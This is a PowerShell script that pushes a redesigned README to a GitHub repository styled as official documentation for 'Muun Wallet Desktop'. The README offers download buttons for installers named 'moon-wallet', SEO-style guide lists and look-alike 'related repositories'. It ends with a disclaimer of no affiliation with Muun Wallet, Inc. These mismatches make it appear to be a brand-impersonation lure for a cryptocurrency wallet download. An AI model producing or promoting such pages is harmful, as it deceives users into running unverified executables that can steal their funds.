cd "C:\Users\user\Downloads\muun-wallet-github-pack\muun-wallet-docs-setup"

$headers = @{
    Authorization = "Bearer $env:GITHUB_TOKEN"
    Accept = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}

$newReadme = @'
<div align="center">

<img src="https://raw.githubusercontent.com/muun-network/muun-wallet/main/assets/logo.png" width="80" alt="Muun Wallet" />

# Muun Wallet Docs

**Guides, tutorials, and reference articles for Muun Wallet Desktop**
*Self-custodial Bitcoin and Lightning wallet for macOS, Windows, and Linux*

[![Release](https://img.shields.io/badge/release-v0.5.1-blue?style=for-the-badge)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
[![Bitcoin](https://img.shields.io/badge/bitcoin-only-orange?style=for-the-badge)](https://muun-wallet.com/)
[![Non-custodial](https://img.shields.io/badge/non--custodial-2of2_multisig-purple?style=for-the-badge)](https://muun-wallet.com/)

---

### Download Muun Wallet Desktop v0.5.1

[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg)
[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe)
[![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

| Platform | File | SHA-256 Checksum |
|:---:|:---:|:---|
| 🍎 macOS 11+ | [moon-wallet-v0.5.1.dmg](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
| 🪟 Windows 10/11 | [moon-wallet-v0.5.1.exe](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
| 🐧 Linux x64 | [moon-wallet-v0.5.1.zip](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |

[View full release notes and all downloads](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) &nbsp;|&nbsp; [muun-wallet.com](https://muun-wallet.com/)

</div>

---

## Getting Started

New to Muun Wallet? Start here.

| Guide | Description |
|:---|:---|
| [Getting started: install, backup, first transaction](docs/muun-wallet-getting-started-guide.md) | Complete first-time setup walkthrough |
| [Install on macOS](docs/how-to-install-muun-wallet-macos.md) | DMG install, Gatekeeper, first launch |
| [Install on Windows](docs/how-to-install-muun-wallet-windows.md) | EXE installer, SmartScreen, first launch |
| [Install on Linux](docs/how-to-install-muun-wallet-linux.md) | ZIP extract, permissions, desktop launcher |
| [Verify your download (SHA-256)](docs/how-to-verify-muun-wallet-download.md) | Check checksums on macOS, Windows, Linux |

---

## Security and Recovery

| Guide | Description |
|:---|:---|
| [Is Muun Wallet safe?](docs/is-muun-wallet-safe.md) | The 2-of-2 multisig model, plainly explained |
| [Emergency Kit: complete recovery guide](docs/muun-wallet-emergency-kit-recovery-guide.md) | How to set up and use your Emergency Kit |
| [Seed phrase vs Emergency Kit](docs/muun-wallet-seed-phrase-vs-emergency-kit.md) | Why Muun does not use a BIP39 phrase |
| [How to back up your wallet](docs/how-to-back-up-muun-wallet.md) | Step-by-step backup walkthrough |
| [Lost device recovery](docs/muun-wallet-lost-device-recovery.md) | How to recover funds on a new machine |

---

## Lightning Network

| Guide | Description |
|:---|:---|
| [Lightning fees explained](docs/muun-wallet-lightning-fees-explained.md) | Submarine swaps, routing costs, what you pay |
| [What is a submarine swap?](docs/what-is-a-submarine-swap.md) | How Muun routes Lightning payments on-chain |
| [Send a Lightning payment](docs/how-to-send-lightning-payment-muun-wallet.md) | Step-by-step send walkthrough |
| [Receive a Lightning payment](docs/how-to-receive-lightning-payment-muun-wallet.md) | Invoice, Lightning Address, LNURL |
| [Lightning Addresses and LNURL-pay](docs/muun-wallet-lnurl-pay-lightning-address.md) | Static addresses for tips and recurring payments |

---

## Transactions and Fees

| Guide | Description |
|:---|:---|
| [All fees explained](docs/muun-wallet-fees-explained.md) | On-chain, Lightning, and swap costs |
| [Fix a stuck transaction (RBF)](docs/muun-wallet-stuck-transaction-rbf.md) | Bump fees on unconfirmed transactions |
| [Withdraw to an exchange](docs/how-to-withdraw-from-muun-wallet.md) | Send to Coinbase, Kraken, Binance, etc. |
| [Coin control](docs/muun-wallet-coin-control.md) | Select specific UTXOs per transaction |

---

## Comparisons

| Article | |
|:---|:---|
| [Muun vs Sparrow Wallet](docs/muun-wallet-vs-sparrow-wallet.md) | Lightning vs advanced on-chain control |
| [Muun vs Phoenix Wallet](docs/muun-wallet-vs-phoenix-wallet.md) | Swap-based vs native Lightning channels |
| [Muun vs BlueWallet](docs/muun-wallet-vs-bluewallet.md) | Desktop vs mobile-first |
| [Muun vs Electrum](docs/muun-wallet-vs-electrum.md) | Lightning support and track record |
| [Muun vs Zeus](docs/muun-wallet-vs-zeus.md) | Self-contained wallet vs node interface |
| [Muun vs Wallet of Satoshi](docs/muun-wallet-vs-wallet-of-satoshi.md) | Non-custodial vs custodial |
| [Best Bitcoin desktop wallets 2026](docs/best-bitcoin-desktop-wallets-2026.md) | Full category overview |
| [Best Bitcoin Lightning wallets 2026](docs/best-bitcoin-lightning-wallets-2026.md) | Lightning wallet category compared |
| [Muun Wallet alternatives](docs/muun-wallet-alternatives.md) | When to consider a different wallet |

---

## Review and Reference

| Article | |
|:---|:---|
| [Muun Wallet review 2026](docs/muun-wallet-review-2026.md) | Features, fees, and who it is for |
| [What is Muun Wallet?](docs/what-is-muun-wallet.md) | Plain-language overview |
| [What is a non-custodial Bitcoin wallet?](docs/what-is-a-non-custodial-bitcoin-wallet.md) | Custodial vs non-custodial explained |
| [Privacy: what data is collected](docs/muun-wallet-privacy.md) | Data visibility and how to minimize it |
| [How the fee estimator works](docs/muun-wallet-fee-estimator-explained.md) | Mempool-based estimation explained |

---

<div align="center">

## Related Repositories

| Repo | Purpose |
|:---:|:---|
| [muun-wallet](https://github.com/muun-network/muun-wallet) | Desktop wallet application and releases |
| [recovery](https://github.com/muun-network/recovery) | Emergency Kit recovery tool |
| [librwallet](https://github.com/muun-network/librwallet) | Core wallet library |
| [btcd](https://github.com/muun-network/btcd) | Bitcoin protocol library |
| [bitcoinjinx](https://github.com/muun-network/bitcoinjinx) | Bitcoin primitives library |
| [sqldelight](https://github.com/muun-network/sqldelight) | Local database layer |

---

**[muun-wallet.com](https://muun-wallet.com/)** &nbsp;|&nbsp; **[Download v0.5.1](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)** &nbsp;|&nbsp; **[Report an issue](https://github.com/muun-network/muun-wallet/issues)**

*MIT License. Not affiliated with or endorsed by Muun Wallet, Inc.*

</div>
'@

# Get current SHA of README.md
$existing = Invoke-RestMethod -Method GET -Uri "https://api.github.com/repos/muun-network/muun-wallet-docs/contents/README.md" -Headers $headers
$sha = $existing.sha

# Encode and push
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newReadme))
$body = @{ message = "docs: redesign README with badges, buttons, and full guide index"; content = $encoded; sha = $sha } | ConvertTo-Json -Depth 5
Invoke-RestMethod -Method PUT -Uri "https://api.github.com/repos/muun-network/muun-wallet-docs/contents/README.md" -Headers $headers -Body $body -ContentType "application/json" | Out-Null

Write-Host "README updated successfully" -ForegroundColor Green
